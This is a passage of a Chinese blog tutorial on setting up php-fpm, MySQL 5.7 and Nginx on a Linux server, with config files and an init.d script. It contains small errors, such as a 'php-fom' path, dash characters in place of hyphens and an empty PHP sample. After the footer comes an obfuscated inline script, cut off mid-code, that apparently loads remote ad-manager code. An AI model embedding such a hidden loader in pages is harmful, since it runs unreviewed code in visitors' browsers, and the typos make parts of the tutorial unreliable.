<p>然后可以根据自己服务器的需求，对php.ini文件的内容进行修改</p> 
<h3><a id="44phpfpm_315"></a>4.4、设置php-fpm配置文件</h3> 
<p>依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /alidata/server/php-7.1.11/etc
<span class="token function">cp</span> php-fpm.conf.default php-fpm.conf
<span class="token builtin class-name">cd</span> /alidata/server/php-7.1.11/etc/php-fpm.d
<span class="token function">cp</span> www.conf.default www.conf
</code></pre> 
<p>使用vim命令对php-fpm.conf的内容进行如下修改</p> 
<pre><code>pid= /alidata/server/php-7.1.11/var/run/php-fpm.pid
</code></pre> 
<p>使用vim命令对www.conf的内容进行如下修改</p> 
<pre><code class="prism language-json">user <span class="token operator">=</span> www
group <span class="token operator">=</span> www
listen <span class="token operator">=</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">9000</span>
pm<span class="token punctuation">.</span>max_children <span class="token operator">=</span> <span class="token number">100</span>
pm<span class="token punctuation">.</span>start_servers <span class="token operator">=</span> <span class="token number">20</span>
pm<span class="token punctuation">.</span>min_spare_servers <span class="token operator">=</span> <span class="token number">5</span>
pm<span class="token punctuation">.</span>max_spare_servers <span class="token operator">=</span> <span class="token number">35</span>
</code></pre> 
<p>其他配置可根据自己的情况进行相应修改</p> 
<h3><a id="45phpfpm_338"></a>4.5、启动php-fpm</h3> 
<p>完成以上配置后，即可启动php-fpm，执行以下命令</p> 
<pre><code class="prism language-shell">/alidata/server/php-7.1.11/sbin/php-fpm
</code></pre> 
<p>启动后，使用</p> 
<pre><code class="prism language-shell"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> php-fpm
</code></pre> 
<p>命令查看进程，若能够看到相关进程，则证明启动成功。查询进程时，可以看到进程是以www用户身份执行的</p> 
<h3><a id="46_348"></a>4.6、加入系统环境变量</h3> 
<p>使用vim命令打开/etc/profile文件，在文件最末尾加上如下代码</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable">PHP_HOME</span><span class="token operator">=</span>/alidata/server/php-7.1.11
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span><span class="token builtin class-name">:</span><span class="token variable">$PHP_HOME</span>/bin:<span class="token variable">$PHP_HOME</span>/sbin
</code></pre> 
<p>保存修改后，使用source命令重新加载配置文件，命令如下</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">source</span> /etc/profile
</code></pre> 
<p>执行上述命令后，可使用</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
</code></pre> 
<p>命令查看环境变量中是否已经加入了相关的路径</p> 
<h3><a id="47_363"></a>4.7、加入系统服务</h3> 
<p>使用vim命令在/etc/init.d/目录下创建一个php-fpm文件，命令如下</p> 
<pre><code class="prism language-shell"><span class="token function">vim</span> /etc/init.d/php-fpm
</code></pre> 
<p>文件内容如下</p> 
<pre><code class="prism language-shell"><span class="token shebang important">#!/bin/bash</span>
<span class="token comment"># php-fpm startup script for the php-fpm </span>
<span class="token comment"># php-fpm version:7.1.11</span>
<span class="token comment"># chkconfig: - 85 15</span>
<span class="token comment"># description: php-fpm</span>
<span class="token comment"># processname: php-fpm</span>
<span class="token comment"># pidfile: /alidata/server/php-7.1.11/var/run/php-fpm.pid</span>
<span class="token comment"># config: /alidata/server/php-7.1.11/etc/php-fpm.conf</span>
   
<span class="token assign-left variable">php_command</span><span class="token operator">=</span>/alidata/server/php-7.1.11/sbin/php-fom
<span class="token assign-left variable">php_config</span><span class="token operator">=</span>/alidata/server/php-7.1.11/etc/php-fpm.conf
<span class="token assign-left variable">php_pid</span><span class="token operator">=</span>/alidata/server/php-7.1.11/var/run/php-fpm.pid
<span class="token assign-left variable">RETVAL</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">prog</span><span class="token operator">=</span><span class="token string">"php-fpm"</span>
   
<span class="token comment">#start function</span>
<span class="token function-name function">php_fpm_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    /alidata/server/php-7.1.11/sbin/php-fpm
<span class="token punctuation">}</span>
   
<span class="token function-name function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> -e <span class="token variable">$php_pid</span>  <span class="token punctuation">]</span>
    <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"php-fpm already start..."</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
    <span class="token keyword">fi</span>
    php_fpm_start
<span class="token punctuation">}</span>
   
<span class="token function-name function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> -e <span class="token variable">$php_pid</span> <span class="token punctuation">]</span>
    <span class="token keyword">then</span>
    <span class="token assign-left variable">parent_pid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> $php_pid<span class="token variable">`</span></span>
    <span class="token assign-left variable">all_pid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> php-fpm <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{if('</span>$parent_pid<span class="token string">' == $3){print $2}}'</span><span class="token variable">`</span></span>
    <span class="token keyword">for</span> <span class="token for-or-select variable">pid</span> <span class="token keyword">in</span> <span class="token variable">$all_pid</span>
    <span class="token keyword">do</span>
            <span class="token function">kill</span> <span class="token variable">$pid</span>
        <span class="token keyword">done</span>
        <span class="token function">kill</span> <span class="token variable">$parent_pid</span>
    <span class="token keyword">fi</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
   
<span class="token function-name function">restart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    stop
    start
<span class="token punctuation">}</span>
   
<span class="token comment"># See how we were called.</span>
<span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>
start<span class="token punctuation">)</span>
        start
        <span class="token punctuation">;</span><span class="token punctuation">;</span>
stop<span class="token punctuation">)</span>
        stop
        <span class="token punctuation">;</span><span class="token punctuation">;</span>
restart<span class="token punctuation">)</span>
        stop
        start
        <span class="token punctuation">;</span><span class="token punctuation">;</span>
status<span class="token punctuation">)</span>
        status <span class="token variable">$prog</span>
        <span class="token assign-left variable">RETVAL</span><span class="token operator">=</span><span class="token variable">$?</span>
        <span class="token punctuation">;</span><span class="token punctuation">;</span>
*<span class="token punctuation">)</span>
        <span class="token builtin class-name">echo</span> $<span class="token string">"Usage: <span class="token variable">$prog</span> {start|stop|restart|status}"</span>
        <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">esac</span>
<span class="token builtin class-name">exit</span> <span class="token variable">$RETVAL</span>
</code></pre> 
<p>其中，php_command表示php-fpm可执行脚本的路径，php_config表示php-fpm的配置文件路径，php_pid表示php-fpm进程文件的路径</p> 
<h3><a id="48phpfpm_441"></a>4.8、设置php-fpm开机自启动</h3> 
<p>经过上面的操作，php-fpm已被添加为系统服务，所以可以将其设置为开机自启动，这样就可以避免每次服务器重启之后需要手动开启php-fpm的操作，具体命令如下</p> 
<pre><code class="prism language-shell"><span class="token function">chkconfig</span> --add php-fpm
<span class="token function">chkconfig</span> php-fpm on
</code></pre> 
<p>或者</p> 
<pre><code class="prism language-shell">systemctl <span class="token builtin class-name">enable</span> php-fpm
</code></pre> 
<h2><a id="5MySQL_451"></a>5、安装MySQL</h2> 
<h3><a id="51cmake_452"></a>5.1、下载并安装cmake</h3> 
<p>官网：<a href="https://cmake.org/" rel="nofollow" title="https://cmake.org/">https://cmake.org/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> https://cmake.org/files/v3.10/cmake-3.10.0-rc5.tar.gz
<span class="token function">tar</span> –zxvf cmake-3.10.0-rc5.tar.gz
</code></pre> 
<p>以上命令完成下载和解压操作，接下来进行安装操作</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> cmake-3.10.0-rc5
./configure --prefix<span class="token operator">=</span>/alidata/package/cmake
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/package/cmake/bin:<span class="token environment constant">$PATH</span>
</code></pre> 
<h3><a id="52ncurses_468"></a>5.2、下载并安装ncurses</h3> 
<p>官网：<a href="http://invisible-island.net/ncurses/" rel="nofollow" title="http://invisible-island.net/ncurses/">http://invisible-island.net/ncurses/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> http://ftp.gnu.org/gnu/ncurses/ncurses-6.0.tar.gz
<span class="token function">tar</span> –zxvf ncurses-6.0.tar.gz
</code></pre> 
<p>以上命令完成下载和解压操作，接下来进行安装操作</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> ncurses-6.0
./configure --prefix<span class="token operator">=</span>/alidata/package/ncurses
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span>
</code></pre> 
<h3><a id="53libaio_483"></a>5.3、安装libaio库</h3> 
<p>执行以下命令</p> 
<pre><code class="prism language-shell">yum <span class="token function">install</span> libaio*
</code></pre> 
<p>安装libaio和libaio-devel这两个库</p> 
<h3><a id="54MySQL_489"></a>5.4、为MySQL添加用户及组</h3> 
<p>为了保证操作系统的安全，这里为mysql工作进程创建专用的用户</p> 
<pre><code class="prism language-shell"><span class="token function">groupadd</span> mysql
<span class="token function">useradd</span> -r -g mysql mysql
</code></pre> 
<p>5.5、下载并安装MySQL<br> 官网：<a href="https://www.mysql.com" rel="nofollow" title="https://www.mysql.com">https://www.mysql.com</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz
<span class="token function">tar</span> –zxvf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz
<span class="token function">mv</span> mysql-5.7.20-linux-glibc2.12-x86_64 /alidata/server/mysql-5.7.20/
</code></pre> 
<p>这里使用的是mysql官方提供的解压缩版的安装方式，不需要进行make操作。将mysql文件夹移动到安装路径后，需要修改mysql安装文件夹的权限，执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token function">chown</span> –R mysql.mysql /alidata/server/mysql-5.7.20/
</code></pre> 
<p>后续如果在该目录及其子目录下创建了任何文件和文件夹，均需要再次执行该命令，以确保mysqld进程对该文件夹具有完全的读写权限</p> 
<h3><a id="56mysql_509"></a>5.6、设置mysql配置文件</h3> 
<p>mysql的配置文件是放在/etc/目录下的，名字是my.cnf，具体配置如下</p> 
<pre><code>[client]
port            = 3306
socket          = /alidata/server/mysql-5.7.20/tmp/mysql.sock
[mysqld]
basedir=/alidata/server/mysql-5.7.20
datadir=/alidata/server/mysql-5.7.20/data
socket=/alidata/server/mysql-5.7.20/tmp/mysql.sock
#skip-external-locking
# Disabling symbolic-links is recommended to prevent assorted security risks
symbolic-links=0
# Settings user and group are ignored when systemd is used.
# If you need to run mysqld under a different user or group,
# customize your systemd unit file for mariadb according to the
# instructions in http://fedoraproject.org/wiki/Systemd
log-error=/alidata/logs/mysql/error.log
pid-file=/alidata/logs/mysql/mysql.pid

[mysqld_safe]
log-error=/alidata/logs/mariadb/error.log
pid-file=/alidata/logs/mariadb/mariadb.pid

#
# include all files from the config directory
#
!includedir /etc/my.cnf.d
</code></pre> 
<p>这里需要注意，配置文件最后一行引入了新的配置文件，下面列出my.cnf.d目录下名为mysql-clients.cnf的配置文件内容</p> 
<pre><code>#
# These groups are read by MariaDB command-line tools
# Use it for options that affect only one utility
#

[mysql]

[mysql_upgrade]

[mysqladmin]

[mysqlbinlog]

[mysqlcheck]

[mysqldump]

[mysqlimport]

[mysqlshow]

[mysqlslap]

</code></pre> 
<p>在my.cnf配置文件中，需要注意几个配置，其中basedir指的是mysql的安装目录，datadir指的是mysql数据文件的存储目录，其他几项配置项，如果大家感兴趣可以自行查看官方解释。还需要特别说明的一个问题是，所有在配置文件中出现的路径、文件均需要具有可读写的权限，前面为MySQL创建了用户及组，所以上述配置文件中涉及到的路径和文件，均需要将其所有者及组指定为mysql用户，这样MySQL服务才能正常启动。<br> 完成以上配置后，需要将mysqld的启动脚本放入/etc/init.d/路径中，执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token function">cp</span> –a /alidata/server/mysql-5.7.20/support-files/mysql.server /etc/init.d/mysqld
</code></pre> 
<p>拷贝完成后，使用vim命令，修改/etc/init.d/mysqld中的basedir和datadir，确保其值与my.cnf文件中的内容相同</p> 
<h3><a id="57MySQL_570"></a>5.7、初始化MySQL</h3> 
<p>因本文采用的是MySQL 5.7.20版本，所以不能使用mysql_install_db命令，而是需要使用mysqld –initialize命令对数据库进行初始化，具体命令如下</p> 
<pre><code class="prism language-shell">/alidata/server/mysql-5.7.20/bin/mysqld –initialize --user<span class="token operator">=</span>mysql --basedir<span class="token operator">=</span>/alidata/server/mysql-5.7.20/ --datadir<span class="token operator">=</span>/alidata/server/mysql-5.7.20/data/
</code></pre> 
<p>若前面配置文件中的各配置项均正确，各路径、文件均存在并可读写，改命令将提示执行成功，并能够在/root/目录下生成一个.mysql_secret文件，使用cat命令可查看其内容，其是mysql中本地root用户的初始密码。这里需要特别说明一下，本文作者使用mysql自动生成初始密码没有登录成功，然后通过安全启动脚本对mysql的root用户密码进行修改后，才能够正常登录和使用，所以这一步目前无法得到确认，大家可根据自己的实际情况处理。</p> 
<h3><a id="58MySQL_576"></a>5.8、使用安全模式启动MySQL</h3> 
<p>在mysql安装目录的bin目录下，使用以下命令启动mysql</p> 
<pre><code class="prism language-shell">./mysqld_safe --user<span class="token operator">=</span>mysql <span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>
</code></pre> 
<p>启动后，使用初始化所得的root密码登录mysql，查看是否可以正常操作，命令如下</p> 
<pre><code class="prism language-shell">./mysql –uroot –p
</code></pre> 
<h3><a id="59MySQL_585"></a>5.9、设置MySQL服务开机自启</h3> 
<p>依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /alidata/server/mysql-5.7.20/bin/
<span class="token function">chkconfig</span> --level <span class="token number">35</span> mysqld on
</code></pre> 
<p>5.10. 启动MySQL服务<br> 前文使用的是安全模式启动，现在，需要让MySQL服务正常启动，首先，通过命令</p> 
<pre><code class="prism language-shell"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> mysql
</code></pre> 
<p>查找到通过mysqld_safe命令启动的进程，使用kill命令将其全部杀掉，然后使用</p> 
<pre><code class="prism language-shell">/etc/init.d/mysqld start
</code></pre> 
<p>命令，启动MySQL服务，接下来，就请使用root用户登录，然后进行创建用户，创建数据库，赋权等操作，这部分属于MySQL的基本操作，本文不再赘述。</p> 
<h2><a id="6NginxPHPMySQL_601"></a>6、配置Nginx+PHP+MySQL</h2> 
<p>与Apache服务器不同的是，Nginx本身并不解释、运行PHP代码，Nginx只是将用户端发来的HTTP请求进行转发，真正解释运行PHP代码的是php-fpm进程，所以，这里只需要将Nginx收到的http请求转发给php-fpm即可。<br> 根据本文前序步骤，已经完成了Nginx和PHP的安装和配置，接下来，只需要在Nginx的配置文件中加入转发至php-fpm的配置即可。</p> 
<h3><a id="61NginxPHP_604"></a>6.1、配置Nginx+PHP</h3> 
<p>本文中对Nginx进行了多域名配置，每个域名只需要在/alidata/server/nginx-1.12.2/conf/vhosts目录下有一个自己的配置文件即可，所以重点就在这个配置文件里，现在假定我们需要查看当前服务器的php信息，因为本文没有涉及到域名解析及配置的相关信息，所以这里就以IP访问为例进行配置讲解，首先，需要在我们的web代码根路径/alidata/webapps下创建一个info.php文件，执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token function">vim</span> /alidata/webapps/info.php
</code></pre> 
<p>文件内容是一段非常简单的php代码</p> 
<pre><code class="prism language-php">
</code></pre> 
<p>保存文件后，对Nginx的配置文件进行修改，前文已经在/alidata/server/nginx-1.12.2/conf/vhosts目录下创建了default.conf配置文件，现在对这个文件的内容进行修改，修改后的内容如下</p> 
<pre><code class="prism language-json">server <span class="token punctuation">{<!-- --></span>
        listen       <span class="token number">80</span><span class="token punctuation">;</span>
        server_name  localhost<span class="token punctuation">;</span>
        index index<span class="token punctuation">.</span>php index<span class="token punctuation">.</span>htm index<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
        root <span class="token operator">/</span>alidata<span class="token operator">/</span>webapps<span class="token punctuation">;</span>
        location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>php<span class="token operator">|</span>php5<span class="token punctuation">)</span><span class="token operator">?</span>$
        <span class="token punctuation">{<!-- --></span>
                #fastcgi_pass  unix<span class="token operator">:</span><span class="token operator">/</span>tmp<span class="token operator">/</span>php<span class="token operator">-</span>cgi<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
                fastcgi_pass  <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">9000</span><span class="token punctuation">;</span>
                fastcgi_index index<span class="token punctuation">.</span>php<span class="token punctuation">;</span>
                include fastcgi<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>gif<span class="token operator">|</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>png<span class="token operator">|</span>bmp<span class="token operator">|</span>swf<span class="token punctuation">)</span>$
        <span class="token punctuation">{<!-- --></span>
                expires 30d<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>js<span class="token operator">|</span>css<span class="token punctuation">)</span><span class="token operator">?</span>$
        <span class="token punctuation">{<!-- --></span>
                expires 1h<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        # 配置页面静态化
        include <span class="token operator">/</span>alidata<span class="token operator">/</span>server<span class="token operator">/</span>nginx<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.2</span><span class="token operator">/</span>conf<span class="token operator">/</span>rewrite<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
        access_log  <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>log<span class="token punctuation">;</span>
        error_log <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>log<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可以看到，与之前的配置文件相比，主要是index配置项后，多了关于php的配置内容，以及location相关配置中，多了对于php的内容，保存以上配置文件，使用</p> 
<pre><code class="prism language-shell">systemctl reload nginx
</code></pre> 
<p>命令，重新加载配置文件后，通过浏览器访问http://服务器的IP/info.php，即可看到上文中php代码的运行效果，具体如下图所示<br> <img src="https://images2.imgbox.com/cf/c3/XDOXHPIS_o.png" alt="php配置信息"><br> 至此，即完成了Nginx和PHP的配置，这里需要说明，上述的配置只是最简单的配置，若项目不是运行在web根目录下的，那么配置文件也需要对应的进行修改，若项目是采用CodeIgniter或Laravel等其他框架技术开发的，那么也需要对配置文件进行相应修改，这部分内容大家可自行百度，有很多相关的博客。</p> 
<h3><a id="62MySQL_648"></a>6.2、关于MySQL配置的说明</h3> 
<p>正如前文所说，Nginx的工作主要是转发请求，所以MySQL的配置也仅仅需要在PHP中安装相关扩展，只要通过PHP代码可以访问到MySQL即可，不需要再进行其他特殊的配置。</p> 
<p>所以，到这里也就完成了Nginx+PHP+MySQL的环境安装和配置，如果各位还有什么问题和建议，欢迎留言交流。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/54c053212368f713fb7343dcc54205a4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">《九日集训》day9打卡</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8342d3fb2e087fbe9ded8188eb923314/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">CTF-show-爆破</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2a